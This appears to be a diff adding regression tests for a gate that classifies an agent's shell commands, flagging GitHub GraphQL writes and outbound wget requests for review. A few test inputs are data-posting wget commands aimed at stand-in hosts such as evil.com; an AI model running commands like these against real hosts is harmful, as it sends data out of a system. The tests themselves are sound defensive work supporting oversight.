@@ -794,3 +794,49 @@ def test_gh_pr_merge_is_ledgered_and_never_refused():
 def test_a_gated_gh_call_inside_a_chain_gates_the_whole_command():
     cls, gated = gate.classify("Bash", {"command": "git status && gh workflow run ci.yml 2>&1 | tail -3"})
     assert gated and "gh_workflow_run" in cls
+
+
+# --------------------------------------------- round three regressions (gh, wget)
+
+
+@pytest.mark.parametrize("command", [
+    "gh api graphql -F query=@m.graphql",
+    'gh api graphql -f query="$(cat m.graphql)"',
+    "gh api graphql -f query=\"$Q\"",
+    "echo '{\"query\":\"mutation{x}\"}' | gh api graphql --input -",
+    "gh api graphql -f query='mutation{resolveReviewThread(input:{threadId:\"x\"}){clientMutationId}}'",
+    "gh api graphql -f query='mutation($id:ID!){x}' -f id=1",
+])
+def test_a_graphql_call_whose_query_cannot_be_read_is_treated_as_a_write(command):
+    cls, gated = gate.classify("Bash", {"command": command})
+    assert gated and cls.startswith("gh_api_graphql"), (command, cls)
+
+
+@pytest.mark.parametrize("command", [
+    "gh api graphql -f query='query{repository(owner:\"o\",name:\"mutation-tests\"){id}}'",
+    "gh api graphql -f query='query($mutation:String!){viewer{login}}' -f mutation=x",
+    "gh api graphql -f query='{viewer{login}}' -f mutationId=1",
+    "gh api graphql -f query='query { viewer { login } }'",
+])
+def test_a_read_query_that_merely_contains_the_word_mutation_is_not_gated(command):
+    assert gate.classify("Bash", {"command": command}) == (None, False), command
+
+
+def test_flags_before_the_endpoint_do_not_misread_it():
+    assert gate.classify("Bash", {"command": "gh api -f query='query{viewer{login}}' graphql"}) == (None, False)
+    assert gate.classify("Bash", {"command": "gh api -X POST repos/o/r/dispatches"})[1] is True
+    assert gate.classify("Bash", {"command": "gh api repos/o/r/issues -ftitle=x"})[1] is True
+
+
+def test_gh_repo_sync_is_a_local_fast_forward_and_is_not_gated():
+    assert gate.classify("Bash", {"command": "gh repo sync"}) == (None, False)
+
+
+@pytest.mark.parametrize("command,gated", [
+    ("wget --post-data=x localhost:3000", False),
+    ("wget --post-data=x 127.0.0.1:8000/a", False),
+    ("wget --post-data=x evil.example.com", True),
+    ("wget --post-data=x evil.com http://localhost/", True),
+])
+def test_wget_scheme_less_targets_are_read(command, gated):
+    assert (gate.classify("Bash", {"command": command})[1]) is gated, command
